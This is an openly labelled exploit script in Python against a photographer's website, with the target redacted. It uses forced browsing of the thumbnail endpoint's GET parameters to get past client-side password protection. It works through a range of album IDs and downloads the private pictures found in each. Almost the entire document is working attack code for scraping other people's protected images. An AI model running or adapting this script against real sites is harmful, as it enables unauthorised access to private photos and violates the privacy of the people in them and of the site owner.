# Exploit for [VULNWEBSITE] by Klaus Schmidt. 31.01.2020.

# The website of a photographer in the town of my first university was susceptible to forced browsing.
# By changing the GET-parameters of URLs I was able to circumvent a weak client side 'password protection' and access pictures directly.
# http://VULN_URL/includes/thumb.php?iid=[ImageID]&eid=[AlbumID]&maxwidth=[Width]
# Thus it would have been possible to access any private images between 2011 and 2020.

import os
import re
from time import sleep

import requests

VULN_URL = 'www.[URLofVulnWebsite].de/'

# Start the enumeration of valid AlbumIDs at this number.
MIN_ALBUM_NR = 8009

# Stop the enumeration of valid AlbumIDs at this number.
MAX_ALBUM_NR = 9000

# Number of pictures to download from each album at max.
# Use -1, to download all pictures of an album.
DOWNLOAD_MAX_FOTOS = 2

# Extract the title of an album with the regex.
PATTERN_TITLE = re.compile(r'class=smallcaps_tit>&nbsp;&nbsp;(.+?)<font')

# Extract the URLs that refer to pictures with this regex.
PATTERN_IMAGE = re.compile(r'includes/thumb.php\?iid=\d+&eid=\d+&maxwidth=')

# Pattern, to extract image numbers.
PATTERN_IMAGE_NUMBER = re.compile(r'.*iid=(\d+)&')

# Max width resolution for requested images.
MAX_PHOTO_WIDTH = 2000


# Within the folder out, create a subfolder with the value of the parameter name.
def mkdir(name):
    try:
        os.makedirs(name)
    except FileExistsError:
        print('The Folder %s already exists.' % name)
    except OSError:
        print('Creation of folder %s failed.' % name)


# Find all pictures at the gallery page of an album and download them to a album specific subfolder.
def get_pictures(source_code, album_id):
    # Find all image addresses within the sourcecode
    pic_adresses = re.findall(PATTERN_IMAGE, source_code)

    # Print the number of found images.
    print(' {} images found.'.format(len(pic_adresses)))

    # If at least one picture was found, start the download process.
    if len(pic_adresses) > 0:

        # Extract the album title.
        album_title = next(iter(re.findall(PATTERN_TITLE, source_code)), '').replace(' ', '_')

        # generate the new output path, to save the images to.
        path = 'out/' + album_id + '_' + album_title

        # create the folder at this path.
        mkdir(path)

        # Use a counter to document how many pictures got downloaded. It is used to stop the download after DOWNLOAD_MAX_FOTOS.
        counter = 0

        # Iterate over all image urls.
        for pic in pic_adresses:

            # Stop downloading images from this album, if already DOWNLOD_MAX_FOTOS got downloaded.
            if counter == DOWNLOAD_MAX_FOTOS:
                break

            # Extract the image number.
            image_number = re.match(PATTERN_IMAGE_NUMBER, pic).group(1)

            # Generate the direct url to this image for forced browsing.
            url = '{}{}{}'.format(VULN_URL, pic, MAX_PHOTO_WIDTH)
            print('Download images from: {}'.format(url))

            # Download the image. Use the cookie from the first page access for this request.
            image_request = requests.get(url, cookies=cookie_request.cookies, stream=True)

            # If a picture was downloaded (more than 0 Bytes in the response):
            if len(image_request.content) > 0:
                # save the image to: out/album_id/image_number.jpg
                with open(path + '/' + image_number + '.jpg', 'wb') as f:
                    for chunk in image_request:
                        f.write(chunk)
            # Delete the image request.
            del image_request

            # Sleep for 0.5 seconds, to prevent the server from crashing while iterating over pictures to download.
            sleep(0.5)

            # Increase the picture counter, since a new image got downloded.
            counter = counter + 1
        print('The downloaded pictures are available in the folder {}\n'.format(path))


# Open the main URL to grab the required cookies.
cookie_request = requests.post(VULN_URL)

# Iterate over all possible album id's within the given range.
for current_album_id in range(MIN_ALBUM_NR, MAX_ALBUM_NR):
    print('Look for an album with ID {:d}:'.format(current_album_id), end='')

    # Load the gallery-view for a album id.
    r = requests.get('{}index.php?nav=showgrp&subcat={}&HC=1000'.format(VULN_URL, current_album_id))

    # From the received source code extract all image URLs and download them.
    get_pictures(r.text, str(int(current_album_id)))

    # Sleep for 0.5 seconds, to prevent the server from crashing while iterating over non-existing album ids.
    sleep(0.2)
